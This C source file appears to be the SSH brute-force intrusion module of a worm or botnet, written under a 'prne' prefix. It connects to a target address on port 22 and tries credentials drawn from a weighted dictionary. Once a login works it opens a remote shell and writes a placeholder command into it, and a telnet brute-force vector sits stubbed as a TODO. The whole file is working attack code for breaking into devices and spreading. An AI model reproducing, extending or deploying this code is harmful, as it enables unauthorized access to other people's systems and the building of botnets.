#include "bne.h"
#include "util_ct.h"
#include "util_rt.h"
#include "iset.h"
#include "llist.h"
#include "rnd.h"
#include "libssh2.h"

#include <string.h>
#include <ctype.h>
#include <errno.h>

static const struct timespec BNE_CONN_OP_TIMEOUT = { 60, 0 }; // 1m
static const struct timespec BNE_SCK_OP_TIMEOUT = { 30, 0 }; // 10s
static const struct timespec BNE_CLOSE_OP_TIMEOUT = { 1, 0 }; // 1s
static const struct timespec BNE_ERR_PAUSE = { 0, 500000000 }; // 500ms
#define BNE_CONN_TIMEOUT 5000 // 5s
#define BNE_CONN_ATTEMPT 3

struct prne_bne {
	prne_iset_t cred_set;
	prne_rnd_t rnd;
	prne_bne_result_t result;
	prne_bne_param_t param;
};

typedef struct {
	unsigned int attempt;
	uint16_t port;
} bne_port_t;

typedef struct {
	LIBSSH2_SESSION *ss;
	LIBSSH2_CHANNEL *ch_shell;
	LIBSSH2_CHANNEL *ch_sftp;
	char *auth_list;
	int fd;
	prne_llist_t ports;
} bne_vssh_ctx_t;

static bool bne_build_cred_set (prne_bne_t *ctx) {
	bool ret = true;

	prne_iset_clear(&ctx->cred_set);
	for (size_t i = 0; ret && i < ctx->param.cred_dict->cnt; i += 1) {
		ret = prne_iset_insert(
			&ctx->cred_set,
			(prne_iset_val_t)(ctx->param.cred_dict->arr + i));
	}

	return ret;
}

static void bne_delete_cred_w_id (prne_bne_t *ctx, const char *id) {
	prne_cred_dict_entry_t *ent;
	const char *ent_id;

	if (ctx->param.cb.enter_dd != NULL && !ctx->param.cb.enter_dd()) {
		return;
	}

	for (size_t i = 0; i < ctx->cred_set.size;) {
		ent = (prne_cred_dict_entry_t*)ctx->cred_set.arr[i];
		ent_id = ctx->param.cred_dict->m + ent->id;

		if (strcmp(id, ent_id) == 0) {
			prne_iset_erase(&ctx->cred_set, (prne_iset_val_t)ent);
		}
		else {
			i += 1;
		}
	}

	if (ctx->param.cb.exit_dd != NULL) {
		ctx->param.cb.exit_dd();
	}
}

static void bne_free_result_cred (prne_bne_t *ctx) {
	prne_free(ctx->result.cred.id);
	prne_free(ctx->result.cred.pw);
	ctx->result.cred.id = NULL;
	ctx->result.cred.pw = NULL;
}

static bool bne_do_connect (
	const int af,
	const struct sockaddr *sa,
	const socklen_t sl,
	int *fd,
	pth_event_t ev)
{
	int f_ret;
	struct pollfd pfd;

	*fd = socket(af, SOCK_STREAM, 0);
	if (*fd < 0) {
		return false;
	}
	if (!prne_sck_fcntl(*fd)) {
		return false;
	}

	f_ret = connect(*fd, sa, sl);
	if (f_ret < 0 && errno != EINPROGRESS) {
		goto ERR;
	}

	pfd.fd = *fd;
	pfd.events = POLLOUT;
	f_ret = prne_pth_poll(&pfd, 1, BNE_CONN_TIMEOUT, ev);
	if (f_ret > 0) {
		socklen_t sl = sizeof(int);
		int sov = 0;

		if (!(pfd.revents & ~POLLOUT) &&
			getsockopt(*fd, SOL_SOCKET, SO_ERROR, &sov, &sl) == 0)
		{
			if (sov == 0) {
				return true;
			}
			errno = sov;
		}
	}

ERR:
	prne_close(*fd);
	*fd = -1;
	return true;
}

static void bne_vssh_discon (
	bne_vssh_ctx_t *vs,
	const struct timespec *to,
	const int reason,
	const char *desc)
{
	pth_event_t ev;

	if (vs->ss == NULL) {
		return;
	}

	ev = pth_event(
		PTH_EVENT_TIME,
		prne_pth_tstimeout(*to));
	prne_assert(ev != NULL);

	prne_lssh2_discon(vs->ss, vs->fd, reason, desc, "", ev);
	pth_event_free(ev, FALSE);
}

static void bne_vssh_drop_conn (bne_vssh_ctx_t *vs) {
	prne_shutdown(vs->fd, SHUT_RDWR);

	prne_free(vs->auth_list);
	vs->auth_list = NULL;
	prne_lssh2_free_session(vs->ss);
	vs->ss = NULL;
	prne_close(vs->fd);
	vs->fd = -1;
}

static bool bne_vssh_est_sshconn (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
	bool ret = false;
	uint8_t m_sa[prne_op_max(
		sizeof(struct sockaddr_in),
		sizeof(struct sockaddr_in6))];
	struct sockaddr_in *sa4;
	struct sockaddr_in6 *sa6;
	socklen_t sl;
	int af;
	pth_event_t ev;
	const struct timespec *pause = NULL;

	if (vs->ss != NULL) {
		return true;
	}

	ev = pth_event(
		PTH_EVENT_TIME,
		prne_pth_tstimeout(BNE_CONN_OP_TIMEOUT));
	prne_assert(ev != NULL);

	while (vs->ports.size > 0 && pth_event_status(ev) != PTH_STATUS_OCCURRED) {
		bne_port_t *p = (bne_port_t*)vs->ports.head->element;

		if (pause != NULL) {
			pth_nanosleep(pause, NULL);
			pause = NULL;
		}

		bne_vssh_drop_conn(vs);
		p->attempt += 1;

		switch (ctx->param.subject.ver) {
		case PRNE_IPV_4:
			sl = sizeof(struct sockaddr_in);
			sa4 = (struct sockaddr_in*)m_sa;
			prne_memzero(m_sa, sl);

			sa4->sin_family = af = AF_INET;
			memcpy(&sa4->sin_addr, ctx->param.subject.addr, 4);
			sa4->sin_port = htons(p->port);
			break;
		case PRNE_IPV_6:
			sl = sizeof(struct sockaddr_in6);
			sa6 = (struct sockaddr_in6*)m_sa;
			prne_memzero(m_sa, sl);

			sa6->sin6_family = af = AF_INET6;
			memcpy(&sa6->sin6_addr, ctx->param.subject.addr, 16);
			sa6->sin6_port = htons(p->port);
			break;
		default: continue;
		}

		if (!bne_do_connect(af, (struct sockaddr*)m_sa, sl, &vs->fd, ev)) {
			ctx->result.err = errno;
			goto END;
		}
		if (vs->fd < 0) {
			pause = &BNE_ERR_PAUSE;
			if (p->attempt >= BNE_CONN_ATTEMPT) {
				goto POP;
			}
			continue;
		}

		vs->ss = libssh2_session_init();
		if (vs->ss == NULL) {
			ctx->result.err = errno;
			goto END;
		}
		libssh2_session_set_blocking(vs->ss, 0);

		if (prne_lssh2_handshake(vs->ss, vs->fd, ev) == 0) {
			ctx->result.err = 0;
			ret = true;
			break;
		}
		/* fall-through */
POP:
		// try next port
		prne_free(p);
		prne_llist_erase(&vs->ports, vs->ports.head);
	}

END:
	if (ev != NULL) {
		if (pth_event_status(ev) != PTH_STATUS_OCCURRED) {
			ctx->result.err = ETIMEDOUT;
		}
		pth_event_free(ev, FALSE);
	}
	if (!ret) {
		bne_vssh_drop_conn(vs);
	}

	return ret;
}

/*
*
* Does linear search to save memory. This is slow. But hey, as long as it works.
*/
static bool bne_pop_cred (
	prne_bne_t *ctx,
	const bool per_id)
{
	prne_cred_dict_entry_t *ent, *rc = NULL;
	size_t coin;
	uint_fast16_t w_tmp;
	uint8_t wv;
	prne_iset_t w_set;
	prne_llist_t cl;
	const char *ent_id, *ent_pw;
	bool ret = true, id_match;

	if (ctx->cred_set.size == 0) {
		return false;
	}
	if (ctx->param.cb.enter_dd != NULL && !ctx->param.cb.enter_dd()) {
		ctx->result.err = errno;
		return false;
	}

	prne_init_iset(&w_set);
	prne_init_llist(&cl);

	// gather weight values
	for (size_t i = 0; i < ctx->cred_set.size; i += 1) {
		ent = (prne_cred_dict_entry_t*)ctx->cred_set.arr[i];
		if (!prne_iset_insert(&w_set, (prne_iset_val_t)(ent->weight))) {
			ctx->result.err = errno;
			ret = false;
			goto END;
		}
	}

	do {
		w_tmp = 0;
		for (size_t i = 0; i < w_set.size; i += 1) {
			w_tmp += (uint_fast16_t)w_set.arr[i];
		}

		// determine weight
		if (!prne_rnd(&ctx->rnd, (uint8_t*)&coin, sizeof(size_t))) {
			ctx->result.err = errno;
			ret = false;
			goto END;
		}

		if (w_tmp > 0) {
			coin = coin % w_tmp;

			w_tmp = 0;
			wv = (uint8_t)(w_set.arr[w_set.size - 1]);
			for (size_t i = 0; i < w_set.size; i += 1) {
				w_tmp += (uint_fast16_t)w_set.arr[i];
				if (coin < w_tmp) {
					wv = (uint8_t)(w_set.arr[i]);
					break;
				}
			}
		}
		else {
			wv = 0;
		}

		// search
		prne_llist_clear(&cl);
		for (size_t i = 0; i < ctx->cred_set.size; i += 1) {
			ent = (prne_cred_dict_entry_t*)ctx->cred_set.arr[i];
			ent_id = ctx->param.cred_dict->m + ent->id;

			if (per_id && ctx->result.cred.id != NULL) {
				id_match = strcmp(ctx->result.cred.id, ent_id) == 0;
			}
			else {
				id_match = true;
			}

			if (id_match && ent->weight == wv) {
				if (!prne_llist_append(&cl, (prne_llist_element_t)ent)) {
					ret = false;
					ctx->result.err = errno;
					goto END;
				}
			}
		}

		if (cl.size > 0) {
			prne_llist_entry_t *le;

			if (!prne_rnd(&ctx->rnd, (uint8_t*)&coin, sizeof(size_t))) {
				ctx->result.err = errno;
				ret = false;
				goto END;
			}
			coin = coin % cl.size;

			le = cl.head;
			for (size_t i = 0; i < coin; i += 1) {
				le = le->next;
			}

			rc = (prne_cred_dict_entry_t*)le->element;
			goto END;
		}
		else {
			// try next weight value
			prne_iset_erase(&w_set, (prne_iset_val_t)(wv));
		}
	} while (w_set.size > 0);

END:
	prne_free_iset(&w_set);
	prne_free_llist(&cl);
	bne_free_result_cred(ctx);
	if (rc != NULL && ret) {
		size_t id_len, pw_len;

		prne_iset_erase(&ctx->cred_set, (prne_iset_val_t)rc);

		ent_id = ctx->param.cred_dict->m + rc->id;
		ent_pw = ctx->param.cred_dict->m + rc->pw;
		id_len = strlen(ent_id);
		pw_len = strlen(ent_pw);

		ctx->result.cred.id = prne_alloc_str(id_len);
		ctx->result.cred.pw = prne_alloc_str(pw_len);
		if (ctx->result.cred.id == NULL || ctx->result.cred.pw == NULL) {
			ctx->result.err = errno;
			ret = false;
			bne_free_result_cred(ctx);
		}
		else {
			memcpy(ctx->result.cred.id, ent_id, id_len + 1);
			memcpy(ctx->result.cred.pw, ent_pw, pw_len + 1);
		}
	}

	if (ctx->param.cb.exit_dd != NULL) {
		ctx->param.cb.exit_dd();
	}

	return ret;
}

static bool bne_vssh_login (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
	bool ret = false;
	pth_event_t ev = NULL;
	int f_ret;

	while (true) {
		if (!bne_vssh_est_sshconn(ctx, vs)) {
			break;
		}

		if (ctx->result.cred.id == NULL || ctx->result.cred.pw == NULL) {
			if (!bne_pop_cred(ctx, true)) {
				break;
			}
			if (ctx->result.cred.id == NULL) {
				// have to try different ID
				bne_vssh_discon(
					vs,
					&BNE_CLOSE_OP_TIMEOUT,
					SSH_DISCONNECT_BY_APPLICATION,
					"this ain't over!");
				bne_vssh_drop_conn(vs);
				continue;
			}
		}

		pth_event_free(ev, FALSE);
		ev = pth_event(
			PTH_EVENT_TIME,
			prne_pth_tstimeout(BNE_SCK_OP_TIMEOUT));
		prne_assert(ev != NULL);

		if (vs->auth_list == NULL) {
			const char *tmp = prne_lssh2_ua_list(
				vs->ss,
				vs->fd,
				ctx->result.cred.id,
				ev,
				NULL);

			if (tmp != NULL) {
				const size_t len = strlen(tmp);

				vs->auth_list = prne_alloc_str(len);
				if (vs->auth_list == NULL) {
					ctx->result.err = errno;
					break;
				}
				memcpy(vs->auth_list, tmp, len + 1);
				prne_transstr(vs->auth_list, tolower);
			}
			else if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
				break;
			}
		}

		f_ret = prne_lssh2_ua_authd(vs->ss, vs->fd, ev);
		if (f_ret < 0) {
			bne_vssh_drop_conn(vs);
			if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
				break;
			}
			continue;
		}

		if (f_ret == 0) {
			// need auth
			// check vs->auth_list maybe?
			f_ret = prne_lssh2_ua_pwd(
				vs->ss,
				vs->fd,
				ctx->result.cred.id,
				ctx->result.cred.pw,
				ev);
			if (f_ret == LIBSSH2_ERROR_AUTHENTICATION_FAILED) {
/*
* server's not accepting the credentials that had been used for the
* first time
*/
				prne_free(ctx->result.cred.pw);
				ctx->result.cred.pw = NULL;
				continue;
			}
			if (f_ret != 0) {
				bne_vssh_drop_conn(vs);
				if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
					break;
				}
				continue;
			}
		}

		// after auth, acquire shell
		do { // FAKE LOOP
			vs->ch_shell = prne_lssh2_open_ch(
				vs->ss,
				vs->fd,
				ev,
				NULL);
			if (vs->ch_shell == NULL) {
				break;
			}
#if 0 // without terminal
			if (prne_lssh2_ch_req_pty(
				vs->ss,
				vs->ch_shell,
				vs->fd,
				"vanilla",
				ev))
			{
				break;
			}
#endif
			if (prne_lssh2_ch_sh(vs->ss, vs->ch_shell, vs->fd, ev)) {
				break;
			}

			ret = true;
			ctx->result.err = 0;
		} while (false);

		if (!ret) {
			if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
				break;
			}
			// credential worked, but could not open shell with this account
			bne_delete_cred_w_id(ctx, ctx->result.cred.id);
			bne_free_result_cred(ctx);
			bne_vssh_discon(
				vs,
				&BNE_CLOSE_OP_TIMEOUT,
				SSH_DISCONNECT_BY_APPLICATION,
				"this ain't over!");
			bne_vssh_drop_conn(vs);
			continue;
		}
		break;
	}

	pth_event_free(ev, FALSE);
	return ret;
}

static bool bne_do_vec_telnet (prne_bne_t *ctx) {
	// TODO
	return false;
}

static bool bne_vssh_do_shell (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
	// TODO
	static const char *CMD = "echo \"boop!\" > /tmp/prne.boop\n";
	prne_lssh2_ch_write(vs->ss, vs->ch_shell, vs->fd, CMD, strlen(CMD), NULL);
	return true;
}

static bool bne_do_vec_ssh (prne_bne_t *ctx) {
	static const uint16_t SSH_PORTS[] = { 22 };
	bool ret = false;
	bne_vssh_ctx_t vssh_ctx;

	prne_memzero(&vssh_ctx, sizeof(bne_vssh_ctx_t));
	vssh_ctx.fd = -1;
	prne_init_llist(&vssh_ctx.ports);

	bne_free_result_cred(ctx);

	for (size_t i = 0; i < sizeof(SSH_PORTS)/sizeof(uint16_t); i += 1) {
		bne_port_t *p = prne_calloc(sizeof(bne_port_t), 1);

		if (p == NULL) {
			ctx->result.err = errno;
			goto END;
		}
		p->port = SSH_PORTS[i];

		if (!prne_llist_append(
			&vssh_ctx.ports,
			(prne_llist_element_t)p))
		{
			prne_free(p);
			ctx->result.err = errno;
			goto END;
		}
	}

	if (!bne_build_cred_set(ctx)) {
		ctx->result.err = errno;
		goto END;
	}

	if (!bne_vssh_login(ctx, &vssh_ctx)) {
		goto END;
	}

	// `ctx->result.cred` must be set at this point
	if (vssh_ctx.ch_shell != NULL) {
		ret = bne_vssh_do_shell(ctx, &vssh_ctx);
	}

END:
	bne_vssh_discon(
		&vssh_ctx,
		&BNE_CLOSE_OP_TIMEOUT,
		SSH_DISCONNECT_BY_APPLICATION,
		"thank you");
	bne_vssh_drop_conn(&vssh_ctx);
	for (prne_llist_entry_t *e = vssh_ctx.ports.head; e != NULL; e = e->next) {
		prne_free((void*)e->element);
	}
	prne_free_llist(&vssh_ctx.ports);
	return ret;
}

static void bne_free_ctx_f (void *p) {
	prne_bne_t *ctx = (prne_bne_t*)p;

	if (ctx == NULL) {
		return;
	}

	prne_free_iset(&ctx->cred_set);
	prne_free_rnd(&ctx->rnd);
	prne_free_bne_param(&ctx->param);
	bne_free_result_cred(ctx);
	prne_free(ctx);
}

static void bne_fin_f (void *p) {
	// do nothing
}

static void *bne_entry_f (void *p) {
	prne_bne_t *ctx = (prne_bne_t*)p;
	bool f_ret;

	for (size_t i = 0; i < ctx->param.vector.cnt; i += 1) {
		switch (ctx->param.vector.arr[i]) {
		case PRNE_BNE_V_BRUTE_TELNET:
			f_ret = bne_do_vec_telnet(ctx);
			break;
		case PRNE_BNE_V_BRUTE_SSH:
			f_ret = bne_do_vec_ssh(ctx);
			break;
		}

		if (f_ret) {
			ctx->result.vec = ctx->param.vector.arr[i];
			break;
		}
	}

	return &ctx->result;
}

void prne_init_bne_param (prne_bne_param_t *p) {
	prne_memzero(p, sizeof(prne_bne_param_t));
	p->rcb.self = PRNE_ARCH_NONE;
}

void prne_free_bne_param (prne_bne_param_t *p) {}

const char *prne_bne_vector_tostr (const prne_bne_vector_t v) {
	switch (v) {
	case PRNE_BNE_V_BRUTE_TELNET: return "telnet";
	case PRNE_BNE_V_BRUTE_SSH: return "ssh";
	}
	return NULL;
}

prne_bne_t *prne_alloc_bne (
	prne_worker_t *w,
	mbedtls_ctr_drbg_context *ctr_drbg,
	const prne_bne_param_t *param)
{
	prne_bne_t *ret = NULL;
	uint8_t seed[PRNE_RND_WELL512_SEEDLEN];

	if (ctr_drbg == NULL) {
		errno = EINVAL;
		return NULL;
	}

// TRY
	ret = (prne_bne_t*)prne_calloc(sizeof(prne_bne_t), 1);
	if (ret == NULL) {
		goto ERR;
	}
	prne_init_iset(&ret->cred_set);
	prne_init_bne_param(&ret->param);
	prne_init_rnd(&ret->rnd);

	if (mbedtls_ctr_drbg_random(ctr_drbg, seed, sizeof(seed)) != 0) {
		goto ERR;
	}
	if (!prne_rnd_alloc_well512(&ret->rnd, seed)) {
		goto ERR;
	}

	ret->param = *param;

	ret->result.subject = &ret->param.subject;
	ret->result.vec = PRNE_BNE_V_NONE;
	ret->result.prc = PRNE_PACK_RC_OK;

	w->ctx = ret;
	w->entry = bne_entry_f;
	w->fin = bne_fin_f;
	w->free_ctx = bne_free_ctx_f;
	return ret;
ERR: // CATCH
	if (ret != NULL) {
		bne_free_ctx_f(ret);
		ret = NULL;
	}

	return NULL;
}
